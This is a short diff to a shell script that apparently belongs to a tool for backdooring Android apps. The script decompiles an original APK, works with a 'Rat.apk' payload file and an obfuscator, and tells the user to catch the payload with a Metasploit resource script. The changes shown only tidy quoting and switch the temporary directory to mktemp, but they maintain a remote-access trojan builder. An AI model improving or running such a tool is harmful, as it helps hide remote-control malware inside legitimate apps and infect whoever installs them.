@@ -34,13 +34,13 @@ ASO=third-party/android-string-obfuscator/lib/aso
 DX=third-party/android-sdk-linux/build-tools/25.0.2/dx
 ZIPALIGN=third-party/android-sdk-linux/build-tools/25.0.2/zipalign
 # file paths and misc
-MY_PATH=`pwd`
-TMP_DIR=$MY_PATH/tmp
+MY_PATH="$(pwd)"
+TMP_DIR="$(mktemp -d)"
 ORIG_APK_FILE=$1
 ORIG_APK_FILE_NAME=""
 RAT_APK_FILE=Rat.apk
 LOG_FILE=$MY_PATH/run.log
-TIME_OF_RUN=`date`
+TIME_OF_RUN="$(date)"
 # for functions
 FUNC_RESULT=""
 
@@ -279,7 +279,7 @@ echo "[+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc"
 ORIG_APK_FILE_NAME=`echo "${ORIG_APK_FILE##*/}"`
 echo "Wroking on original APK: $ORIG_APK_FILE_NAME" >>$LOG_FILE 2>&1
 echo -n "[*] Decompiling original APK file..."
-$APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
+$APKTOOL d -f -o "$MY_PATH/original" "$MY_PATH/$ORIG_APK_FILE" >> "$LOG_FILE" 2>&1
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
